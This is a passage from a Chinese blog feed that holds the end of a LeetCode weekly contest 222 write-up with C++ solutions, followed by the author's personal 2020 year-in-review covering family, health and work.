class="number">3</span>,<span class="number">5</span>) 和 (<span class="number">7</span>,<span class="number">9</span>) 。</span><br><span class="line">它们各自的美味程度之和分别为 <span class="number">4</span> 、<span class="number">8</span> 、<span class="number">8</span> 和 <span class="number">16</span> ，都是 <span class="number">2</span> 的幂。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：deliciousness = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">7</span>]</span><br><span class="line">输出：<span class="number">15</span></span><br><span class="line">解释：大餐的美味程度组合为 <span class="number">3</span> 种 (<span class="number">1</span>,<span class="number">1</span>) ，<span class="number">9</span> 种 (<span class="number">1</span>,<span class="number">3</span>) ，和 <span class="number">3</span> 种 (<span class="number">1</span>,<span class="number">7</span>) 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= deliciousness.length &lt;= 105</code></li><li><code>0 &lt;= deliciousness[i] &lt;= 220</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/count-good-meals" target="_blank" rel="noopener">https://leetcode-cn.com/problems/count-good-meals</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> hash</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>hash统计即可，如果直接<code>hash</code>统计的话，发现会超时，因此我们需要进行优化，将数字相同的进行合并统计。</li><li>然后判断是否存在当前数与另外一个数的和刚好等于$2^{n}$,按照题目中的数据量的规则$n\in[0,21]$.我们依次遍历即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countPairs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = A.size();</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; cnt;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; curr;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) cnt[A[i]]++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : cnt)&#123;</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> x = v.first;</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> y = v.second;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">21</span>; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>((<span class="number">1</span>&lt;&lt;j) &gt;= x)&#123;</span><br><span class="line">                    <span class="keyword">if</span>((x&lt;&lt;<span class="number">1</span>) == (<span class="number">1</span>&lt;&lt;j))&#123;</span><br><span class="line">                        ans = (ans + (y<span class="number">-1</span>)*y/<span class="number">2</span>)%mod;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        ans = (ans + curr[(<span class="number">1</span>&lt;&lt;j)-x]*y)%mod;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            curr[x] = y;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5643-将数组分成三个子数组的方案数"><a href="#5643-将数组分成三个子数组的方案数" class="headerlink" title="5643. 将数组分成三个子数组的方案数"></a>5643. 将数组分成三个子数组的方案数</h2><p>我们称一个分割整数数组的方案是 好的 ，当它满足：</p><ul><li>数组被分成三个 非空 连续子数组，从左至右分别命名为<code>left</code>， <code>mid</code>， <code>right</code> 。</li><li><code>left</code>中元素和小于等于<code>mid</code>中元素和，<code>mid</code>中元素和小于等于<code>right</code>中元素和。<br>给你一个 非负 整数数组 <code>nums</code> ，请你返回 好的 分割 <code>nums</code>方案数目。由于答案可能会很大，请你将结果对 <code>109 + 7</code>取余后返回。</li></ul><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：唯一一种好的分割方案是将 nums 分成 [<span class="number">1</span>] [<span class="number">1</span>] [<span class="number">1</span>] 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">0</span>]</span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：nums 总共有 <span class="number">3</span> 种好的分割方案：</span><br><span class="line">[<span class="number">1</span>] [<span class="number">2</span>] [<span class="number">2</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">0</span>]</span><br><span class="line">[<span class="number">1</span>] [<span class="number">2</span>,<span class="number">2</span>] [<span class="number">2</span>,<span class="number">5</span>,<span class="number">0</span>]</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>] [<span class="number">2</span>,<span class="number">2</span>] [<span class="number">5</span>,<span class="number">0</span>]</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：没有好的分割方案。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>3 &lt;= nums.length &lt;= 105</code></li><li><code>0 &lt;= nums[i] &lt;= 104</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/ways-to-split-array-into-three-subarrays" target="_blank" rel="noopener">https://leetcode-cn.com/problems/ways-to-split-array-into-three-subarrays</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 贪心算法</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>本质上首先我们看到题目中给定的数量可知，本题一定最多用到的时间复杂度为$O(n\lg{n})$,所以自然而然就会想到二分查找。</li><li>仔细分析一下题目，首先肯定需要用到前缀和，然后我们仔细分析一下满足$left \le mid \le right$的约束条件。</li><li>我们能想到的办法，每次固定<code>i</code>，将分数分为两部分，前半部分为$left + mid$,后半部分为$right$,则我们可以用前缀和在$O(1)$的时间复杂度内求出$sum(left+mid)$,$sum(right)$.</li></ol><ul><li>我们根据题目中的要求如果满足$left \le mid$,则肯定需要满足如下约束条件:<script type="math/tex; mode=display">2*sum(left) \le sum(left+right) \\sum(left) \le \frac{sum(left+right)}{2}</script></li><li>我们根据题目中的要求如果满足$mid \le right$,则肯定需要满足如下约束条件:<script type="math/tex; mode=display">sum(left+mid) \le 2*sum(right)</script></li><li>我们根据题目中的要求如果满足$left \le mid \le right$,则肯定需要满足如下约束条件:<script type="math/tex; mode=display">sum(left+mid) \le sum(right) + sum(left) \\sum(left) \ge sum(left+right) - sum(right)</script>综上我们可以得到$sum(left)$的约束条件如下：<script type="math/tex; mode=display">sum(left+right) - sum(right) \le sum(left) \le \frac{sum(left+right)}{2}</script>我们可以两次二分查找很容易得到<code>left</code>的可能的组合个数。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">waysToSplit</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; sum(n);</span><br><span class="line">        </span><br><span class="line">        sum[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.size(); ++i)&#123;</span><br><span class="line">            sum[i] = sum[i<span class="number">-1</span>] + nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n<span class="number">-1</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> tail = sum[n<span class="number">-1</span>] - sum[i];</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> curr = sum[n<span class="number">-1</span>] - tail;</span><br><span class="line">            <span class="keyword">if</span>(curr &gt; <span class="number">2</span>*tail) <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//upper</span></span><br><span class="line">            <span class="keyword">auto</span> it1 = upper_bound(sum.begin(),sum.begin()+i,curr/<span class="number">2</span>);</span><br><span class="line">            <span class="comment">//lower</span></span><br><span class="line">            <span class="keyword">auto</span> it2 = lower_bound(sum.begin(),sum.begin()+i,curr-tail);</span><br><span class="line">            ans = (ans + (it1-it2))%mod;</span><br><span class="line">        &#125;</span><br><span class="line">                                  </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5644-得到子序列的最少操作次数"><a href="#5644-得到子序列的最少操作次数" class="headerlink" title="5644. 得到子序列的最少操作次数"></a>5644. 得到子序列的最少操作次数</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个数组 <code>target</code> ，包含若干 互不相同 的整数，以及另一个整数数组 <code>arr</code>，<code>arr</code>可能 包含重复元素。</p><p>每一次操作中，你可以在 arr 的任意位置插入任一整数。比方说，如果 <code>arr = [1,4,1,2]</code>，那么你可以在中间添加 3 得到 <code>[1,4,3,1,2]</code> 。你可以在数组最开始或最后面添加整数。</p><p>请你返回 最少 操作次数，使得 <code>target</code>成为 arr 的一个子序列。</p><p>一个数组的 子序列 指的是删除原数组的某些元素（可能一个元素都不删除），同时不改变其余元素的相对顺序得到的数组。比方说，<code>[2,7,4]</code>是 <code>[4,2,3,7,2,1,4]</code> 的子序列（加粗元素），但 <code>[2,4,2]</code>不是子序列。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：target = [<span class="number">5</span>,<span class="number">1</span>,<span class="number">3</span>], arr = [<span class="number">9</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：你可以添加 <span class="number">5</span> 和 <span class="number">1</span> ，使得 arr 变为 [<span class="number">5</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>] ，target 为 arr 的子序列。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：target = [<span class="number">6</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>], arr = [<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">3</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= target.length, arr.length &lt;= 105</code></li><li><code>1 &lt;= target[i], arr[i] &lt;= 109</code></li><li><code>target</code> 不包含任何重复元素。</li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-operations-to-make-a-subsequence" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-operations-to-make-a-subsequence</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> LIS dp</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>我们可以知道初始拿到题目我们可以知道该题目可以用<code>lcs</code>问题来解决，当然直接解决该问题的话用二维<code>dp</code>即可.</li><li>题目还是非常好的，但是需要转换一下思路，我们将所有的数组中的元素都转换成目标元素中的索引，此时我们求出最长的索引递增子序列的长度，我们即可求出最小的步数。<br><a href="https://blog.csdn.net/qq_39763472/article/details/88653168" target="_blank" rel="noopener">LIS</a></li><li>设递<code>dp[i]</code>表示长度为<code>i</code>且结尾的索引为<code>dp[i]</code>,每次找到第一个大于等于当前索引的数进行替换即可。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minOperations</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; target, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = target.size();</span><br><span class="line">        <span class="keyword">int</span> m = arr.size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; cnt;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; idx;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) cnt[target[i]] = i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt.count(arr[i])) idx.push_back(cnt[arr[i]]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dp;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : idx)&#123;</span><br><span class="line">            <span class="keyword">auto</span> it = lower_bound(dp.begin(),dp.end(),v);</span><br><span class="line">            <span class="keyword">if</span>(it == dp.end())&#123;</span><br><span class="line">                dp.emplace_back(v);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                *it = v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> n - dp.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-weekly-contest-222&quot;&gt;&lt;a href=&quot;#leetcode-weekly-contest-222&quot; class=&quot;headerlink&quot; title=&quot;leetcode  weekly contest 222&quot;&gt;&lt;/a&gt;leetcode  weekly contest 222&lt;/h1&gt;&lt;p&gt;周赛的题目，最后一题还是思路很慢，思考了半天竟然没有想到最长递增子序列&lt;code&gt;LIS&lt;/code&gt;问题。年龄大了，真心感觉思维越来越不行。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/01/03/uUjfexl9cq28YHW.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;5641-卡车上的最大单元数&quot;&gt;&lt;a href=&quot;#5641-卡车上的最大单元数&quot; class=&quot;headerlink&quot; title=&quot;5641. 卡车上的最大单元数&quot;&gt;&lt;/a&gt;5641. 卡车上的最大单元数&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;请你将一些箱子装在 一辆卡车 上。给你一个二维数组 &lt;code&gt;boxTypes&lt;/code&gt; ，其中 &lt;code&gt;boxTypes[i] = [numberOfBoxesi, numberOfUnitsPerBoxi]&lt;/code&gt; ：&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【2020】总结</title>
    <link href="http://yoursite.com/2021/01/03/239/"/>
    <id>http://yoursite.com/2021/01/03/239/</id>
    <published>2021-01-03T02:16:56.445Z</published>
    <updated>2021-01-03T10:05:17.996Z</updated>
    
    <content type="html"><![CDATA[<h3 id="2020总结"><a href="#2020总结" class="headerlink" title="2020总结"></a>2020总结</h3><ul><li>转眼间2020年已经过去了，时间过的飞快，很快就迎接了2021年，回首2020年收获了许多，也失去了许多，我想这一年应该是觉得人生中最为难忘和艰难的一年，这也是为自己正式踏入中年苦逼人生中最浓重的一笔。这一年经历了人生中第一个最重大疫情，在家休过最长的长假，家中的两个宝贝一天天在长大，变化最大的就是自己的宝贝女儿，可爱的像朵花一样，每天回家最开心的就是看见儿子和女儿。工作中也迎来了最艰难和责任最重大的一年，工作上只能说还凑合。这一年在健身和学习上进步了许多。<br><a href="http://mikemeng.org/2020/01/02/118/" target="_blank" rel="noopener">2019年总结</a><br><a href="http://mikemeng.org/2020/07/05/177/" target="_blank" rel="noopener">2020年下半年计划</a><h4 id="生活流水账"><a href="#生活流水账" class="headerlink" title="生活流水账"></a>生活流水账</h4></li><li>2月至4月期间，经历了人生中遇到过第一次最严重的疫情，后果是基本上快三个月都呆在家里不能出门，不能锻炼身体，真心的感觉生活很压抑。再也不想重新来一遍，这么束缚的生活，每天吃了睡和睡了吃的生活真心也是一种负担。</li><li>5月到8月，基本上每天都是在家里看娃，每天家里两个娃吵吵闹闹，忙的不亦乐乎。七月以后感觉不能再这样昏昏耗耗下去了，重新制定了学习计划，健身计划，坚持按照目标来执行。</li><li>8月又经历了父亲了病重，只能请年家回了趟老家，安顿好父亲，父亲经过两个星期的治疗，身体逐步有所好转，只能暂时将老父亲安顿在姐姐家。这个年纪了，父亲一天天老去，能陪伴他的日子越来越少了，我只能尽自己最大的努力给他尽好孝心。能抽空回家就尽量抽空回家看望老父亲。</li><li>9月到11月基本上时间稍微闲暇一些，按照自己的学习进度和目标，安排了许多学习的计划和锻炼身体的计划，目前基本达成自己的初步目标。</li><li>12月份年底的工作压力特别大，因为要在年底前完成许多的工作，忙的不可开交，终于迎来了稍微轻松的元旦，之道此时才又机会和空闲来总结和整理下不平凡的2020年。<h4 id="家庭"><a href="#家庭" class="headerlink" title="家庭"></a>家庭</h4></li><li>今年变化最快的是小宝，今年已经一岁半了。从一个婴儿终于成长了一个可爱粉嫩的小公主了，刚开始只会漫天爬的婴儿，变成了每天会骑滑板车和捣乱的小天使了。每天都是粉嫩的脸蛋和天真无辜的眼神，让人忍不住怜爱，每天都要亲爸爸，亲妈妈。<br><img src="https://i.loli.net/2021/01/03/zaZPQMxqiILOEmV.jpg" alt><br><img src="https://i.loli.net/2021/01/03/IJwR9pKsDZrlbkN.jpg" alt></li><li>大宝今年已经满4岁了，并且顺利的上了中班，从以前连字都吐不清楚，到现在可以清晰的表达自己的想法，现在也可以正常的更人交流了，变化真的很大。作为父母的感慨时间过的真快，同时也感慨生命的神奇，转眼间小伙子长大了。几年前还是个小男宝，丫丫学语，啥都不会，转眼间技能树已经快速点满。同时也意识到，儿女一天天长大，终有一天他们会离我们远去去追寻他们的梦想，那时作为父母的只能放手让他们去拼搏，无论人生道路上又多么艰难，父母无无怨无悔的支持你们，爸爸妈妈永远都是你们坚强的后盾。<br><img src="https://i.loli.net/2021/01/03/qGClBQbfv7Xs2Tg.jpg" alt="1"></li><li>依稀还记得某日清晨醒来，看见一对儿女熟睡得样子，真心让人怜惜。我总是会幻想，女儿长大以后会是什么样子，儿子长大后会是什么样子，作为父亲得我，才刚步入中年，就已经开始幻想几十年后得光阴，不得不让人感慨，时间是个神奇的武器，丫丫细语的幼儿已经成了葱郁的少年；岁月也是把杀猪刀，青葱的少年转眼间已成了油腻的中年。<br><img src="https://i.loli.net/2021/01/03/49KonJzR3WSmDUQ.jpg" alt></li><li>老父亲今年已经76岁高龄了，父亲年龄越来越大了，目前基本上每年都会生一次重病，需要住院。今年稍微安顿好了一些，把老夫请安顿在姐姐家，所有的开支费用由我来承担，主要担心老人年纪过大，身边又没人照看，万一出现意外，那真心是悔过，顺便也能姐姐照顾一下小外甥。2021年准备换好房子，能把老父亲接到武汉来住几天，真心感觉结婚以后，基本上个人都被家庭和工作缠身，能给老父亲分担的时间和精力越来越少，新的一年也祝愿老父亲身体硬朗。</li><li>姐姐自从离婚后，生活上也出现了许多困难，先是经历了骨折，后又经历了搬家，工作上也是非常的辛苦，大外甥马上也要中考了，姐夫是肯定指望不上了，毕竟他不参与家庭生活，不知道生活的难处，希望她能在未来的生活中照顾好自己，照顾好家庭。</li><li>最后是老婆，岳父，岳母。LD的工作压力真心大，连续两个月基本上周末都在加班中度过，感觉跟着自己太不容易了，体制内的工作，工资待遇福利没多少，加班出差少不了，有时候不免心神怨气，周末还要忙着学车，忙着社区下沉，还要照顾两个孩子的饮食起居，还要忙着干家务，想想都头大，中年最难熬的时光，希望能够坚持下去，也要照顾好身体。对于岳父母，自己感觉也是亏欠很多，岳父每天早出晚归，这么大年龄了还需要经常熬夜上夜班，岳母今年大病了一场，自然而然的不免有些自责，望着岳父母都有些花白的头发，内心不自然而然的自责，没能给他们一个好的经济基础让他们安详晚年。</li><li>对于自身来说，其实内心非常的焦虑。因为在自己最需要金钱的时候，而没有能力提供一个很好的经济基础，能够让自己的家人过上幸福的日子。有时候因为自己的臭脾气也让爱人，岳父母承担了许多不必要的麻烦，真心要给他们说一声道歉。新的一年争取，让岳父母和老婆能够出国游玩一趟，能够每个月定期给他们一部分零花钱，定期组织家里出去聚餐和游玩一次，给老婆办一个健身卡，给岳父母买一个重疾保险，这是自己在这一年的目标。</li></ul><a id="more"></a><h4 id="健康"><a href="#健康" class="headerlink" title="健康"></a>健康</h4><ul><li>2020年上半年的时候，经历了疫情，几个月都没有机会锻炼身体，明显感觉身体素质下降，最明显的感触就是容易发胖，精力不足，非常容易困，每天基本上到点以后必须上传睡觉，否则铁定困得不行。熬夜是铁定不行，现在熬夜一次，恨不得要睡上两天才能回来，不像以前熬一个星期都扛得住。</li><li>2020年下半年，人到中年的危机感越来越重，更加坚定的知道自己的目标和方向，坚决不做一条随波逐流的咸鱼，于时刻意开始改变自己，开始给自己制定锻炼得计划和目标，比较好得结果是制定得锻炼目标基本完成，年终计划是到年底完成锻炼50次，最终打卡结束锻炼完成了59次。后面是因为健身房得游泳馆关门了，导致不得不中断自己得锻炼计划，一旦停下来运动，明显感觉身体素质下降，容易困，并且长时间休息不好得话就会易怒，容易形成恶性循环，所以生活走上正常轨道得开始应该是养好身体为基础得，因为只有这样，你的生活才能进入正循环，因为身体好了，才能休息的好，休息的好了，才能心情好，心情好了，才能工作交流愉快，工作顺利了，又会使得你升职加薪，升职加薪又会导致你身心愉快，这样的正循环中才能让你士气高涨，生活走入正常轨道，否则人很容易在负面循环中永远都出不去。</li><li>9月到11月，基本上开启了定时锻炼身体的规律运动，经过三个月的坚持，首先从自身来说改变了很多。身高174，从去年冬天的68.5，变成了64.5kg的标准体重，肚子上的肥肉终于减下去了，身体变轻了许多，同时睡眠好了很多，每天只睡7个小时，让人心情非常愉快。长期坚持运动能够给人不仅仅是健康，更加带来一个积极心态的变化，没有游泳之前，经常动不动就觉得因为工作上的事情感到非常抑郁和沮丧，对自己的前途和生活感到绝望，坚持锻炼身体带给自己的很多愉快的心情，让自己每天身上充满激情干劲和正能量，自己的心情也随之改变了许多，许多以前想不开的事情，慢慢也就能够想开和明白，不要把成败看的太重，反而能够更好的去工作。坚持运动这个习惯一定要继续，坚持每天打卡。希望在2021年能够坚持锻炼，坚持游泳，保持好体重，目标全年锻炼超过100次。<br><img src="https://i.loli.net/2021/01/03/iHG1nJhKIRB5g7k.png" alt><br><img src="https://i.loli.net/2021/01/03/R4jJrwNiYSCAhlX.png" alt="2"></li></ul><h4 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h4><ul><li>今年的工作可以说是没什么太多好说的，除了日常的工作以外，工作的压力大了许多，感觉抗打击能力强大了许多。以前总听说“归零”，现在终于能够体会到什么叫做“归零”了。锻炼好身体，保持好心态，不管外部环境如何变化，始终都能够坦然的面对眼前的一切，无论外部环境好与坏，都能够从容应对，哪怕现在从最底层做起，也会坚持奋斗。因为只要有希望有机会，做好自己，从容面对一切困难和风雨。</li><li>今年的工作总体来说不太顺利，有段时间真心想要逃离和崩溃的感觉。下半年各项工作勉强顺利开展，后面两个月通过坚持锻炼身体让自己的心情和状态大有好转，期待每天的工作能够给自己带来成长和挑战，越来越喜欢这种自信和挑战的状态，越来越能拓展自己的边界。不断的告知自己外面的世界很大，哪里都有挑战，哪里都有困难，要坚强的去面对。</li><li>在当前的大环境下，体制内收入竟然递减，无这也是对自身工作积极性的一种打击。现实环境如此，只能依靠自己的想法去改变和拓展边界，靠山靠水不如靠自己，自己从小是从苦日子中长大的，面对所有的艰辛和困难都不会轻易屈服。无论如何，工作态度一定要端正，积极应对新一年的挑战。</li></ul><h4 id="读书学习"><a href="#读书学习" class="headerlink" 